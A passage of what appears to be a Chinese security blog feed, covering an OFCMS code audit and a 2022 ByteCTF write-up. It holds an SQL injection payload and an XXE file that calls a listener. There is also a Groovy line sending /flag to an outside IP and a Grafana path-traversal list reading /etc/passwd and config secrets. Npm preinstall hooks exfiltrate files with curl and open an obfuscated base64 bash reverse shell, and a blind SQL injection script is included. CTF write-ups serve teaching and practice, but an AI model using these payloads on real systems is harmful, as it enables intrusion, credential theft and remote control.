class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Action(path = &quot;/comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommentApi</span> <span class="keyword">extends</span> <span class="title class_">ApiBase</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取内容信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiMapping(method = RequestMethod.GET)</span></span><br><span class="line">    <span class="meta">@ParamsCheck(</span></span><br><span class="line"><span class="meta">            &#123;@ParamsCheckType(name = &quot;comment_content&quot;), @ParamsCheckType(name = &quot;content_id&quot;),</span></span><br><span class="line"><span class="meta">                    @ParamsCheckType(name = &quot;site_id&quot;)&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Map</span> <span class="variable">params</span> <span class="operator">=</span> getParamsMap();</span><br><span class="line">            params.put(<span class="string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));</span><br><span class="line">            Db.update(Db.getSqlPara(<span class="string">&quot;cms.comment.save&quot;</span>, params));</span><br><span class="line">            rendSuccessJson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            rendFailedJson();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里获取评论内容之后，直接更新的数据库，将评论内容存入数据库</p><p>对应的前端代码<code>ofcms-admin\src\main\webapp\WEB-INF\page\default\article.html</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018111429592.png" alt="image-20221018111429592"></p><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><p>对应的功能  <code>系统设置--&gt;代码生成--&gt;增加</code></p><p>burp抓包，这里可以使用update进行sql注入</p><p>找到对应的文件<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateController.java</code></p><p>对应于create()函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152537326.png" alt="image-20221018152537326"></p><p>跟进Db.update()函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152649536.png" alt="image-20221018152649536"></p><p>跟进MAIN.update()函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152716738.png" alt="image-20221018152716738"></p><p>跟进update函数</p><p>260行进行数据库连接，261行进行数据库的更新操作</p><p>调用顺序，update的互相调用</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018153342634.png" alt="image-20221018153342634"></p><p>总体的调用过程大概就是这样</p><p>从数据库中找个表，of_sys_user，用来测试</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018154839190.png" alt="image-20221018154839190"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> of_sys_user <span class="keyword">set</span> login_name<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>) <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>可以看到爆出数据库名</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018155004307.png" alt="image-20221018155004307"></p><h3 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h3><p>漏洞入口处位于<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/ReprotAction.java</code>的expReport()函数中</p><p>函数前面主要是限制文件的后缀为jrxml，以及生成文件输入流，确定文件位置等等</p><p>跟进JasperCompileManager.compileReport方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162303618.png" alt="image-20221018162303618"></p><p>到达JasperCompileManager.class，跟进compile</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162421235.png" alt="image-20221018162421235"></p><p>跟进JRXmlLoader.load函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162614018.png" alt="image-20221018162614018"></p><p>跟进load函数，load函数又调用另一个同名函数，最终调用xmlLoader.loadXML</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162736867.png" alt="image-20221018162736867"></p><p>跟进xmlLoader.loadXML，其中<strong>调用了Digester类的parse解析我们文件输入流，也就是xml文档内容，并且默认没有禁用外部实体解析，所以存在xxe漏洞</strong></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162839764.png" alt="image-20221018162839764"></p><h4 id="xxe漏洞利用"><a href="#xxe漏洞利用" class="headerlink" title="xxe漏洞利用"></a>xxe漏洞利用</h4><p>利用之前的文件上传，上传一个xxe.jrxml文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018163729204.png" alt="image-20221018163729204"></p><p>文件内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.74.177:7777&quot;</span>&gt;</span>%test; ]&gt;</span></span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/ofcms_admin/admin/reprot/expReport.html?j=../../static/xxe</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018163700093.png" alt="image-20221018163700093"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次算是javacms的入门审计，跟着大佬的博客进行环境搭建与代码审计分析，以及漏洞利用。因为之前有php的审计基础，所以java上手还行，不算慢。</p><p>对freemarker模板注入，Digester.parse导致的xxe漏洞，以及任意文件上传（和传统的文件上传有些区别）都有了了解与实践。</p><p>这个过程中也是了解到了真实环境下漏洞的挖掘与利用，之后会分析更多的javacms，提高自己的审计能力。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://blog.csdn.net/YouthBelief/article/details/122978328">(11条消息) 【Java代码审计】OFCMS 1.1.3 审计_YouthBelief的博客-CSDN博客_javacms代码审计</a></li><li><a href="https://blog.csdn.net/Alexz__/article/details/116426132">初识java代码审计——ofcms 1.1.4内容管理系统代码审计_Alexz__的博客-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ofcms </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022bytectf</title>
      <link href="/2022/10/18/2022bytectf/"/>
      <url>/2022/10/18/2022bytectf/</url>
      
        <content type="html"><![CDATA[<h2 id="easy-groovy"><a href="#easy-groovy" class="headerlink" title="easy_groovy"></a>easy_groovy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String aa = new File(<span class="string">&quot;/flag&quot;</span>).text</span><br><span class="line">def res1 = new URL(<span class="string">&#x27;http://116.62.240.148:7077?a=&#x27;</span> + aa).text;</span><br></pre></td></tr></table></figure><h2 id="easy-grafana"><a href="#easy-grafana" class="headerlink" title="easy_grafana"></a>easy_grafana</h2><p>8.2.6的版本对应有相应的漏洞</p><p><a href="https://cloud.tencent.com/developer/article/1973276">CVE-2021-43798：Grafana任意文件读取漏洞 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/">Grafana 文件读取漏洞分析与汇总(CVE-2021-43798) - 斗象能力中心</a></p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122126822?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-122126822-blog-121794956.t5_download_0_7w&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-122126822-blog-121794956.t5_download_0_7w&utm_relevant_index=1">(1条消息) Grafana任意文件读取漏洞(CVE-2021-43798)复现_xzhome的博客-CSDN博客_graphite漏洞</a></p><p>受影响的插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertmanager/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/canvas/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashboard/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/debug/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/live/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mixed/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/xychart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-6.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /public/plugins/text/<span class="comment">#/../../../../../../../../../../etc/passwd HTTP/1.1</span></span><br><span class="line">Host: c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun</span><br><span class="line">Cookie: __t_id=9d390487baa727875304965b05e864f7; redirect_to=%2F</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Microsoft Edge&quot;</span>;v=<span class="string">&quot;105&quot;</span>, <span class="string">&quot; Not;A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;105&quot;</span></span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Origin: https://c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-1.png" alt="img"></p><p>读取配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="keyword">public</span>/plugins/text/<span class="comment">#/../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1</span></span><br><span class="line">secret_key = SW2YcwTIb9zpO1hoPsMm</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-2.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">public</span>/plugins/text/<span class="comment">#/../../../../../../../../../../usr/share/grafana/conf/defaults.ini</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-3.png" alt="img"></p><p>发现登录不上去，读数据库<code>/var/lib/grafana/grafana.db</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-4.png" alt="img"></p><p><a href="https://github.com/jas502n/Grafana-CVE-2021-43798">jas502n&#x2F;Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerability (github.com)</a></p><p>对password进行AES解密得flag，密钥用之前的secret_key</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-5.png" alt="img"></p><h2 id="ctf-cloud"><a href="#ctf-cloud" class="headerlink" title="ctf_cloud"></a>ctf_cloud</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926213203175.png" alt="image-20220926213203175"></p><p>然后用户admin，密码1登录</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926213214666.png" alt="image-20220926213214666"></p><p>文件上传</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sk1y&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bash -c &#x27;curl http://ip:7007/ -F --file=@/flag&#x27;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926220836591.png" alt="image-20220926220836591"></p><p>添加依赖</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;sk1y&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:./public/uploads/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926215239212.png" alt="image-20220926215239212"></p><p>监听端口，然后点击编译</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926220643691.png" alt="image-20220926220643691"></p><p>或者反弹shell，将依赖设置为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;sk1y&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;preinstall&quot;</span>: <span class="string">&quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMjQwLjE0OC83MDA3IDA+JjE=|base64 -d|bash&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926221204453.png" alt="image-20220926221204453"></p><p>再或者不使用文件上传功能，根据WM战队的wp，将package.json传到github公开库</p><p>先往github仓库上传一个package.json，然后post提交依赖</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926222037890.png" alt="image-20220926222037890"></p><p>然后在管理员用户下编译</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926222445202.png" alt="image-20220926222445202"></p><h2 id="datamanager"><a href="#datamanager" class="headerlink" title="datamanager"></a>datamanager</h2><p>随意注册然后登录，&#x2F;dashboard?order&#x3D;id处存在SQL注入</p><p>贴一下wm师傅们的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sre_constants <span class="keyword">import</span> SUCCESS</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests = requests.Session()</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#database() == datamanager</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tables : source,users</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#columns from users: current\\_connections,total\\_connections,user,id,n4me,pas$word</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#n4me from users: ctf,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pas$word from users: ctf@BvteDaNceS3cRet,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:-<span class="number">6</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;_%[]&quot;</span>:</span><br><span class="line">                i = <span class="string">&quot;\\\\&quot;</span>+i</span><br><span class="line">            payload = <span class="string">&quot;0x&quot;</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            payload += <span class="string">&quot;25&quot;</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            r = requests.get(url.replace(<span class="string">&quot;PAYLOAD&quot;</span>,payload),proxies=proxies,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment">#if &quot;SORRY!&quot; not in r.text:</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>SQL注入得到用户名和密码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf</span><br><span class="line">ctf@<span class="title class_">BvteDaNceS3</span>cRet</span><br></pre></td></tr></table></figure><p>status处可以执行任意sql语句</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926234457023.png" alt="image-20220926234457023"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"><span class="keyword">Result</span>: [[datamanager]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"><span class="keyword">Result</span>: [[<span class="number">8.0</span><span class="number">.30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables;</span><br><span class="line"><span class="keyword">Result</span>: 